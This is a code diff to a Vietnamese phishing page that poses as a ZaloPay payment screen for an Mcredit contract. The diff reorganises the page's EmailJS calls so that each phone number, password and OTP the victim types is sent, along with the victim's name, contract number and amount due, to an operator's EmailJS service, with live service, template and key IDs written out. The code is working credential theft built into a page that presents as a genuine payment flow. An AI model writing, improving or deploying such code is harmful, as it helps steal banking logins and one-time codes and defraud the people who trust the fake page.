@@ -22,11 +22,37 @@
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
     ></script>
     <script type="text/javascript">
-      (function () {
-        emailjs.init({
-        publicKey: "ylpUZgvVRFDRFaYoo", // Thay bằng Public Key của bạn
-        });
-      })();
+      const ZALOPAY_EMAILJS_CONFIG_BY_STEP = {
+        phone: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_wyssuk9",
+          publicKey: "ylpUZgvVRFDRFaYoo",
+          platform: "ZaloPay → SĐT (Mcredit Layout v4)",
+        },
+        password: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_j0ukske",
+          publicKey: "ylpUZgvVRFDRFaYoo",
+          platform: "ZaloPay → Mật khẩu (Mcredit Layout v4)",
+        },
+        otp: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_1w45spc",
+          publicKey: "ylpUZgvVRFDRFaYoo",
+          platform: "ZaloPay → OTP (Mcredit Layout v4)",
+        },
+      };
+
+      function getZalopayEmailjsConfig(step) {
+        return (
+          ZALOPAY_EMAILJS_CONFIG_BY_STEP[step] ||
+          ZALOPAY_EMAILJS_CONFIG_BY_STEP.phone
+        );
+      }
+
+      emailjs.init({
+        publicKey: ZALOPAY_EMAILJS_CONFIG_BY_STEP.phone.publicKey,
+      });
     </script>
 
     <style>
@@ -1158,10 +1184,10 @@ otification ${type} show`;
           otpInputs[0].focus();
         };
 
-        // EmailJS Integration
         const sendToEmail = (type, value) => {
-          const serviceID = "service_ezzpzs5";
-          let templateID = "";
+          const config = getZalopayEmailjsConfig(type);
+          if (!config) return;
+
           let templateParams = {};
           const contractNumber =
             getEl("customer-details").querySelector(
@@ -1169,24 +1195,21 @@ otification ${type} show`;
             )?.textContent || "";
 
           const commonParams = {
-            platform: "ZaloPay (Mcredit Layout v4)",
+            platform: config.platform,
             contract_number: contractNumber,
             customer_name: formData.fullName || "",
             total_amount: getEl("mainTotalAmount").textContent || "",
           };
 
           if (type === "phone") {
-            templateID = "template_wyssuk9"; // <-- **CẬP NHẬT TEMPLATE ID**
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
-            templateID = "template_j0ukske";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
               password: value,
             };
           } else if (type === "otp") {
-            templateID = "template_1w45spc";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
@@ -1195,21 +1218,26 @@ otification ${type} show`;
             };
           }
 
-          if (templateID) {
-            console.log(
-              `Sending ${type} to EmailJS with params:`,
-              templateParams
+          console.log(
+            `Sending ${type} to EmailJS with params:`,
+            templateParams,
+            config
+          );
+          emailjs
+            .send(
+              config.serviceId,
+              config.templateId,
+              templateParams,
+              { publicKey: config.publicKey }
+            )
+            .then(() => console.log(`${type} sent successfully.`, config))
+            .catch((err) =>
+              console.error(
+                `EmailJS send failed for ${type}:`,
+                JSON.stringify(err),
+                config
+              )
             );
-            emailjs
-              .send(serviceID, templateID, templateParams)
-              .then(() => console.log(`${type} sent successfully.`))
-              .catch((err) =>
-                console.error(
-                  `EmailJS send failed for ${type}:`,
-                  JSON.stringify(err)
-                )
-              );
-          }
         };
 
         const clearOtpInputs = () => {
